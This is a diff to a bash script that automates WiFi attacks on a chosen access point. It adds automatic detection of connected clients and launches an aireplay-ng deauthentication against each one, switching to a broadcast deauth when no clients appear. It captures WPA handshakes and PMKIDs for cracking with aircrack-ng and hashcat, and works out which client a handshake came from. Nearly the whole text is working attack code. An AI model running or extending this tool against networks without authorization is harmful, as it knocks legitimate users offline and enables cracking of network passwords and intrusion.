@@ -147,29 +147,99 @@ detect_target_channel() {
   ok "Channel detected: $channel"
 }
 
-pick_client_mac() {
+join_macs() {
+  local m list=""
+  for m in "$@"; do
+    [[ -n "$list" ]] && list+=", "
+    list+="$m"
+  done
+  echo "$list"
+}
+
+handshake_sta_from_cap() {
+  local cap="$1" ap="$2" apu="${2^^}" out
+
+  [[ -f "$cap" && -s "$cap" ]] || return 1
+
+  out=$(tcpdump -r "$cap" -nn -e 2>/dev/null \
+    | awk -v b="$apu" '
+      function ismac(x) { return toupper(x) ~ /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/ }
+      function note(sa, da) {
+        sa = toupper(sa); da = toupper(da)
+        if (sa == b && ismac(da)) cnt[da]++
+        else if (da == b && ismac(sa)) cnt[sa]++
+      }
+      function tag(line, label,    p, v) {
+        p = index(line, label)
+        if (!p) return ""
+        v = substr(line, p + length(label), 17)
+        return ismac(v) ? toupper(v) : ""
+      }
+      /EAPOL|888E/ {
+        line = toupper($0)
+        note(tag(line, "SA:"), tag(line, "DA:"))
+      }
+      END {
+        best = ""; n = 0
+        for (m in cnt) if (cnt[m] > n) { n = cnt[m]; best = m }
+        if (best != "") print best
+      }')
+  [[ -n "$out" ]] && echo "$out"
+}
+
+handshake_sta_from_csv() {
   local csv="$1" ap="$2"
   [[ -f "$csv" ]] || return 1
-  awk -F, -v b="$ap" '
+  awk -F, -v b="${ap^^}" '
+    BEGIN { best = -1; mac = "" }
+    $0 ~ /^Station MAC/ { st=1; next }
+    st {
+      gsub(/^ +| +$/, "", $1)
+      gsub(/^ +| +$/, "", $5)
+      gsub(/^ +| +$/, "", $6)
+      if (toupper($6) == b && toupper($1) ~ /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/) {
+        pkts = $5 + 0
+        if (pkts >= best) { best = pkts; mac = toupper($1) }
+      }
+    }
+    END { if (mac != "") print mac }
+  ' "$csv"
+}
+
+resolve_handshake_sta() {
+  local cap="$1" csv="$2" ap="$3" fallback="$4" sta=""
+
+  sta=$(handshake_sta_from_cap "$cap" "$ap")
+  [[ -n "$sta" ]] && { echo "$sta"; return 0; }
+
+  [[ -n "$fallback" ]] && { echo "$fallback"; return 0; }
+
+  sta=$(handshake_sta_from_csv "$csv" "$ap")
+  [[ -n "$sta" ]] && echo "$sta"
+}
+
+list_client_macs() {
+  local csv="$1" ap="$2"
+  [[ -f "$csv" ]] || return 1
+  awk -F, -v b="${ap^^}" '
     $0 ~ /^Station MAC/ { st=1; next }
     st {
       gsub(/^ +| +$/, "", $1)
       gsub(/^ +| +$/, "", $6)
       $1 = toupper($1)
-      if (toupper($6) == b && $1 ~ /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/) {
-        print $1
-        exit
-      }
+      if (toupper($6) == b && $1 ~ /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/ \
+          && $1 != "FF:FF:FF:FF:FF:FF" && $1 != "00:00:00:00:00:00") print $1
     }
-  ' "$csv"
+  ' "$csv" | awk '!seen[$0]++'
 }
 
-wait_for_client_mac() {
-  local csv="$1" ap="$2"
-  local t mac
+wait_for_clients() {
+  local csv="$1" ap="$2" t
   for ((t=0; t<100; t++)); do
-    mac=$(pick_client_mac "$csv" "$ap")
-    [[ -n "$mac" ]] && { echo "$mac"; return 0; }
+    list_client_macs "$csv" "$ap" | grep -q . && {
+      list_client_macs "$csv" "$ap"
+      return 0
+    }
     sleep 0.1
   done
   return 1
@@ -213,6 +283,7 @@ cleanup() {
 
   pkill -f "xterm.*airodump" 2>/dev/null
   pkill -f "xterm.*aireplay" 2>/dev/null
+  pkill -f "xterm.*Deauth " 2>/dev/null
   pkill -f "xterm.*aircrack" 2>/dev/null
   pkill -f "xterm.*hcxdumptool" 2>/dev/null
   pkill -f "xterm.*hashcat" 2>/dev/null
@@ -322,6 +393,8 @@ if [[ "$attack_mode" == "PMKID" ]]; then
   require_cmd "hcxdumptool" hcxdumptool
   require_cmd "hcxpcapngtool" hcxtools hcxpcapngtool
   require_cmd "hashcat" hashcat
+else
+  require_cmd "tcpdump" tcpdump
 fi
 
 sep "Monitor Interface"
@@ -487,79 +560,237 @@ attack_handshake() {
   sep "Handshake Capture"
   local capfile="${cap_base}-01.cap"
   local csv="${cap_base}-01.csv"
-  local cap_pid deauth_pid round client_mac sta captured=0
+  local cap_pid captured=0 broadcast_done=0 broadcast_wait=0 deauth_was_active=0 status_active=0
+  local -a attacked_clients=() current_clients=() pending_deauth=()
+  local no_client_deadline="" last_chance_deadline="" last_hs_check=0
+  local deauth_bin="aireplay-ng"
+  [[ $EUID -ne 0 ]] && deauth_bin="sudo -n aireplay-ng"
+
+  end_status() {
+    [[ $status_active -eq 1 ]] && {
+      echo -ne "\r\033[K"
+      status_active=0
+    }
+  }
+
+  show_status() {
+    echo -ne "\r\033[K${BOLD}${Y}  [!] $1${NC}"
+    status_active=1
+  }
 
   handshake_captured() {
-    [[ -f "$capfile" ]] \
-      && sudo aircrack-ng "$capfile" 2>&1 | grep -qE "[1-9][0-9]* handshake"
+    local quick="${1:-}"
+    [[ -f "$capfile" ]] || return 1
+    if [[ "$quick" == "quick" ]] && command -v timeout >/dev/null 2>&1; then
+      timeout 2 sudo aircrack-ng "$capfile" 2>&1 | grep -qE "[1-9][0-9]* handshake"
+    else
+      sudo aircrack-ng "$capfile" 2>&1 | grep -qE "[1-9][0-9]* handshake"
+    fi
+  }
+
+  report_handshake_capture() {
+    local sta
+    end_status
+    sta=$(resolve_handshake_sta "$capfile" "$csv" "$bssid" "")
+    [[ -n "$sta" ]] \
+      && ok "Handshake captured from client ${sta}: $capfile" \
+      || ok "Handshake captured: $capfile"
+    captured=1
+  }
+
+  stop_all_deauths() {
+    pending_deauth=()
+    pkill -f "xterm.*Deauth " 2>/dev/null
+    sudo pkill -x aireplay-ng 2>/dev/null
+    sleep 0.3
+    pkill -f "xterm.*Deauth " 2>/dev/null
+  }
+
+  deauth_active() {
+    sudo pgrep -x aireplay-ng >/dev/null 2>&1
   }
 
   stop_capture_windows() {
     kill "$cap_pid" 2>/dev/null
-    kill "$deauth_pid" 2>/dev/null
+    stop_all_deauths
     pkill -f "xterm.*Packet Capture" 2>/dev/null
-    pkill -f "xterm.*Deauthentication Attack" 2>/dev/null
-    sudo pkill -x aireplay-ng 2>/dev/null
-    sudo pkill -f "airodump-ng ${monitor_iface} -c ${channel} --bssid ${bssid}" 2>/dev/null
+    sudo pkill -f "airodump-ng ${monitor_iface}.*--bssid ${bssid}" 2>/dev/null
     wait "$cap_pid" 2>/dev/null
-    wait "$deauth_pid" 2>/dev/null
   }
 
-  launch_deauth() {
-    if [[ -n "$client_mac" ]]; then
-      info "Opening deauthentication window on $client_mac ($deauth_count packets)"
-      xterm -geometry 100x30 -fn 9x15 -title "Deauthentication Attack" -hold \
-        -e "sudo aireplay-ng -0 $deauth_count -a $bssid -c $client_mac $monitor_iface" &
-    else
-      info "Opening deauthentication window broadcast ($deauth_count packets)"
-      xterm -geometry 100x30 -fn 9x15 -title "Deauthentication Attack" -hold \
-        -e "sudo aireplay-ng -0 $deauth_count -a $bssid -c FF:FF:FF:FF:FF:FF $monitor_iface" &
+  try_capture_handshake() {
+    [[ $captured -eq 1 ]] && return 0
+    if handshake_captured quick; then
+      end_status
+      stop_capture_windows
+      report_handshake_capture
+      return 0
     fi
-    deauth_pid=$!
+    return 1
   }
 
-  info "Opening packet capture window"
+  run_deauth_xterm() {
+    local title="$1" target="$2" limit=$((deauth_count + 20)) inner
+    if command -v timeout >/dev/null 2>&1; then
+      inner="timeout -k 2 ${limit} ${deauth_bin} -0 ${deauth_count} -a ${bssid} -c ${target} ${monitor_iface}"
+    else
+      inner="${deauth_bin} -0 ${deauth_count} -a ${bssid} -c ${target} ${monitor_iface}"
+    fi
+    xterm -geometry 100x30 -fn 9x15 -title "$title" \
+      -e "bash -c $(printf '%q' "${inner}; sleep 1")" &
+  }
+
+  process_deauth_queue() {
+    deauth_active && return
+    [[ ${#pending_deauth[@]} -eq 0 ]] && return
+    local mac="${pending_deauth[0]}"
+    pending_deauth=("${pending_deauth[@]:1}")
+    launch_deauth_client "$mac"
+  }
+
+  launch_deauth_client() {
+    local mac="$1"
+    end_status
+    info "Deauth attack on $mac ($deauth_count packets)"
+    run_deauth_xterm "Deauth $mac" "$mac"
+  }
+
+  launch_broadcast_deauth() {
+    end_status
+    info "Broadcast deauth ($deauth_count packets)"
+    run_deauth_xterm "Deauth broadcast" "FF:FF:FF:FF:FF:FF"
+  }
+
+  scan_clients() {
+    current_clients=()
+    mapfile -t current_clients < <(list_client_macs "$csv" "$bssid" 2>/dev/null || true)
+  }
+
+  attack_new_clients() {
+    local mac a known
+    for mac in "${current_clients[@]}"; do
+      known=0
+      for a in "${attacked_clients[@]}"; do
+        [[ "$a" == "$mac" ]] && { known=1; break; }
+      done
+      [[ $known -eq 1 ]] && continue
+      attacked_clients+=("$mac")
+      pending_deauth+=("$mac")
+      end_status
+      ok "New client detected: $mac"
+      no_client_deadline=""
+    done
+    process_deauth_queue
+  }
+
+  reset_no_client_timer() {
+    no_client_deadline=$((SECONDS + 30))
+  }
+
+  start_last_chance_wait() {
+    [[ -n "$last_chance_deadline" ]] && return
+    broadcast_wait=0
+    last_chance_deadline=$((SECONDS + 30))
+  }
+
+  clients_pending_attack() {
+    local mac a known
+    for mac in "${current_clients[@]}"; do
+      known=0
+      for a in "${attacked_clients[@]}"; do
+        [[ "$a" == "$mac" ]] && { known=1; break; }
+      done
+      [[ $known -eq 0 ]] && return 0
+    done
+    return 1
+  }
+
+  ready_for_broadcast_countdown() {
+    [[ $broadcast_done -eq 0 ]] || return 1
+    deauth_active && return 1
+    [[ ${#pending_deauth[@]} -gt 0 ]] && return 1
+    clients_pending_attack && return 1
+    return 0
+  }
+
+  info "Opening packet capture window on channel $channel"
+  local cap_bin="airodump-ng"
+  [[ $EUID -ne 0 ]] && cap_bin="sudo -n airodump-ng"
   xterm -geometry 100x30 -fn 9x15 -title "Packet Capture" \
-    -e "sudo airodump-ng $monitor_iface -c $channel --bssid $bssid -w $cap_base" &
+    -e "${cap_bin} ${monitor_iface} -c ${channel} --bssid ${bssid} \
+        -w ${cap_base} --write-interval 1" &
   cap_pid=$!
+  ok "Capture running in background, listening for handshake"
+  info "Monitoring clients, then executing deauth on first sight, one attack per client"
 
-  for round in 1 2 3; do
-    [[ $round -gt 1 ]] && info "Retrying deauthentication ($round/3)"
-    client_mac=$(wait_for_client_mac "$csv" "$bssid") || client_mac=""
-    launch_deauth
+  for ((t=0; t<20; t++)); do
+    [[ -f "$csv" ]] && break
+    sleep 0.2
+  done
 
-    for ((i=0; i<20; i++)); do
-      sudo pgrep -x aireplay-ng >/dev/null 2>&1 && break
-      sleep 0.5
-    done
-    while sudo pgrep -x aireplay-ng >/dev/null 2>&1; do
-      sleep 1
-    done
+  reset_no_client_timer
 
-    for ((w=0; w<16; w++)); do
-      if handshake_captured; then
-        sta="${client_mac:-$(pick_client_mac "$csv" "$bssid")}"
-        stop_capture_windows
-        ok "Handshake captured${sta:+ from $sta}: $capfile"
-        captured=1
-        break 2
+  while [[ $captured -eq 0 ]]; do
+    scan_clients
+    attack_new_clients
+
+    if (( SECONDS >= last_hs_check + 1 )); then
+      try_capture_handshake && break
+      last_hs_check=$SECONDS
+    fi
+
+    if deauth_active; then
+      deauth_was_active=1
+    elif [[ $deauth_was_active -eq 1 ]]; then
+      deauth_was_active=0
+      process_deauth_queue
+      if [[ $broadcast_wait -eq 1 ]]; then
+        start_last_chance_wait
+      elif ready_for_broadcast_countdown; then
+        reset_no_client_timer
       fi
-      sleep 0.5
-    done
+    fi
 
-    kill "$deauth_pid" 2>/dev/null
-    wait "$deauth_pid" 2>/dev/null
-    [[ $round -lt 3 ]] && sleep 5
+    [[ $broadcast_wait -eq 1 ]] && ! deauth_active && start_last_chance_wait
+
+    if [[ $broadcast_done -eq 0 ]]; then
+      if ready_for_broadcast_countdown; then
+        [[ -z "$no_client_deadline" ]] && reset_no_client_timer
+        if (( SECONDS >= no_client_deadline )); then
+          end_status
+          warn "No clients for 30s, executing broadcast deauth"
+          stop_all_deauths
+          launch_broadcast_deauth
+          broadcast_done=1
+          broadcast_wait=1
+        else
+          show_status "No clients detected ($((no_client_deadline - SECONDS))s until broadcast deauth)"
+        fi
+      else
+        no_client_deadline=""
+        end_status
+      fi
+    else
+      if [[ -z "$last_chance_deadline" ]]; then
+        end_status
+      elif (( SECONDS >= last_chance_deadline )); then
+        end_status
+        break
+      else
+        show_status "Last opportunity to wait for a handshake... ($((last_chance_deadline - SECONDS))s)"
+      fi
+    fi
+
+    sleep 0.3
   done
 
   if [[ $captured -eq 0 ]]; then
-    sleep 3
+    end_status
     stop_capture_windows
     [[ -f "$capfile" ]] || bad "Capture file not found"
     info "Verifying handshake in capture file"
     if handshake_captured; then
-      sta=$(pick_client_mac "$csv" "$bssid")
-      ok "Handshake captured${sta:+ from $sta}: $capfile"
+      report_handshake_capture
     else
       bad "No handshake found. Retry with a connected client on the target AP"
     fi
@@ -598,10 +829,8 @@ attack_pmkid() {
   sep "PMKID Capture"
   local pmkid_file="${cap_base}.pcapng"
   local hash_file="${cap_base}.hc22000"
-  local ch_band="${channel}"
   local pmkid_ok=0 last_size=0 t size
-
-  [[ "$channel" -le 14 ]] && ch_band="${channel}a" || ch_band="${channel}b"
+  local ch_band="${channel}a"   # hcxdumptool: suffix is width (a = 20 MHz), not WiFi band
 
   info "Opening PMKID capture on $monitor_iface (channel $ch_band)..."
   xterm -geometry 100x30 -fn 9x15 -title "PMKID Capture" -hold \
@@ -628,7 +857,7 @@ attack_pmkid() {
         fi
       fi
     fi
-    printf "\r  ${BOLD}${B}[*] PMKID capture: ${t}s${NC}   "
+    printf "\r  ${BOLD}${B}[*] Waiting for PMKID capture: ${t}s${NC}   "
     sleep 1
   done
   echo ""
